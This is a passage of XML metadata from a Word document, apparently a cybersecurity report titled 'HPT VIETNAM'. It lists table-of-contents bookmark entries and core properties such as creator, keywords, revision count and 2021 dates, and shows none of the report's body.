        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc421454268</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1245234</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>125</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc421454267</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1245234</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>119</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc421454266</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1245234</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>113</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc421454265</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1245234</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>107</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc421454264</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1245234</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>101</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc421454263</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1245234</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>95</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc421454262</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1245234</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>89</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc421454261</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1245234</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>83</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc421454260</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1048626</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>77</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc421454259</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1048626</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>71</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc421454258</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1048626</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>65</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc421454257</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1048626</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>59</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc421454256</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1048626</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>53</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc421454255</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1048626</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>47</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc421454254</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1048626</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>41</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc421454253</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1048626</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>35</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc421454252</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1048626</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>29</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc421454251</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1048626</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>23</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc421454250</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1114162</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>17</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc421454249</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1114162</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>11</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc421454248</vt:lpwstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1114162</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>0</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:i4>5</vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr/>
      </vt:variant>
      <vt:variant>
        <vt:lpwstr>_Toc421454247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HPT VIETNAM</dc:title>
  <dc:creator>SENSITIVE DOCUMENT</dc:creator>
  <cp:keywords>Cybersec</cp:keywords>
  <cp:lastModifiedBy>Sơn Lê Ngọc</cp:lastModifiedBy>
  <cp:revision>38</cp:revision>
  <cp:lastPrinted>2021-06-06T09:38:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2021-06-06T11:14:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2021-06-09T13:31:00Z</dcterms:modified>
</cp:coreProperties>
</file>